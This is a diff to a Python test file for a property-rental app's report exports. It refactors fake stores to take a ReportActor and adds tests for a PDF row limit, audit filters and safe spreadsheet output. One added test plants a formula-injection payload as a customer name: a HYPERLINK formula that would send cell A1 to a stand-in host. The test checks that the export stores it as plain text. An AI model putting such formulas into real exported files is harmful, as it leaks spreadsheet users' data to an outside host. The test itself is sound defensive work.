@@ -23,6 +23,7 @@ from property_rental.audit import _freeze_audit_value
 from property_rental.identity import AuthenticatedActor, CapabilityGrant
 from property_rental.report_exports import AuditExportRequest, paid_for
 from property_rental.report_files import ExportFile
+from property_rental.reports import ReportActor
 from property_rental.settings import Settings
 
 PROPERTY = uuid.uuid4()
@@ -64,14 +65,14 @@ class FakeReportStore:
         self.invoices = invoices
 
     def home_page(
-        self, actor_id: uuid.UUID, property_id: uuid.UUID, sections: Sequence[str]
+        self, actor: ReportActor, property_id: uuid.UUID, sections: Sequence[str]
     ) -> dict[str, object]:
         raise AssertionError("not used")
 
     def rows(
         self,
         read: str,
-        actor_id: uuid.UUID,
+        actor: ReportActor,
         property_id: uuid.UUID,
         extra: Sequence[object] = (),
     ) -> list[dict[str, object]]:
@@ -112,7 +113,7 @@ class FakeExportStore:
 
     def record(
         self,
-        actor_id: uuid.UUID,
+        actor: ReportActor,
         property_id: uuid.UUID,
         kind: str,
         capability: str,
@@ -122,7 +123,7 @@ class FakeExportStore:
 
     def save(
         self,
-        actor_id: uuid.UUID,
+        actor: ReportActor,
         property_id: uuid.UUID,
         export_id: uuid.UUID,
         report: str,
@@ -134,7 +135,7 @@ class FakeExportStore:
     ) -> datetime:
         self.records.append((kind, capability, details))
         self.kept[export_id] = {
-            "actor_id": actor_id,
+            "actor_id": actor.actor_id,
             "report": report,
             "file_type": file_type,
             "file_name": file.file_name,
@@ -146,10 +147,10 @@ class FakeExportStore:
         return GENERATED + timedelta(hours=24)
 
     def take(
-        self, actor_id: uuid.UUID, property_id: uuid.UUID, export_id: uuid.UUID
+        self, actor: ReportActor, property_id: uuid.UUID, export_id: uuid.UUID
     ) -> dict[str, object] | None:
         kept = self.kept.get(export_id)
-        return kept if kept is not None and kept["actor_id"] == actor_id else None
+        return kept if kept is not None and kept["actor_id"] == actor.actor_id else None
 
     def audit_rows(
         self, property_id: uuid.UUID, request: AuditExportRequest
@@ -366,3 +367,54 @@ def test_paid_for_names_each_line_with_its_amount() -> None:
     ]
     assert paid_for(parts) == "Invoices Rent $300.00; Not allocated $10.50"
     assert paid_for(None) == ""
+
+
+class FormulaReportStore(FakeReportStore):
+    def rows(
+        self,
+        read: str,
+        actor: ReportActor,
+        property_id: uuid.UUID,
+        extra: Sequence[object] = (),
+    ) -> list[dict[str, object]]:
+        row = invoice_row(1)
+        row["customer_name"] = '=HYPERLINK("http://example.invalid/?"&A1,"Click")'
+        second = invoice_row(2)
+        second["customer_name"] = "Sok\x0b Dara"
+        return [row, second]
+
+
+def test_a_spreadsheet_keeps_text_as_text_and_drops_control_characters() -> None:
+    """Review round 1: a name starting with "=" is never a live formula in the .xlsx file."""
+    answer = client(person(*MANAGER), FormulaReportStore()).post(
+        EXPORTS, json={"report": "invoice_register", "file_type": "xlsx"}, headers=BROWSER
+    )
+    assert answer.status_code == 200
+    sheet = load_workbook(io.BytesIO(answer.content)).active
+    assert sheet is not None
+    names = {
+        cell.value: cell.data_type
+        for (cell,) in sheet.iter_rows(min_col=2, max_col=2)
+        if cell.value
+    }
+    assert names['=HYPERLINK("http://example.invalid/?"&A1,"Click")'] == "s"
+    assert "Sok Dara" in names
+
+
+def test_a_pdf_holds_at_most_5000_rows_and_odd_filters_are_left_out_of_the_event() -> None:
+    exports = FakeExportStore()
+    manager = client(person(*MANAGER), FakeReportStore(invoices=5001), exports)
+    too_many = manager.post(
+        EXPORTS, json={"report": "invoice_register", "file_type": "pdf"}, headers=BROWSER
+    )
+    assert too_many.status_code == 422 and exports.records == []
+    small = client(person(*MANAGER), FakeReportStore(), exports)
+    answer = small.post(
+        EXPORTS,
+        json={"report": "invoice_register", "file_type": "xlsx", "floor": "2\tB"},
+        headers=BROWSER,
+    )
+    assert answer.status_code == 200
+    [(_, _, details)] = exports.records
+    assert details["filters"] == {"filters_not_recorded_count": 1}
+    _freeze_audit_value(details, "resulting_state")
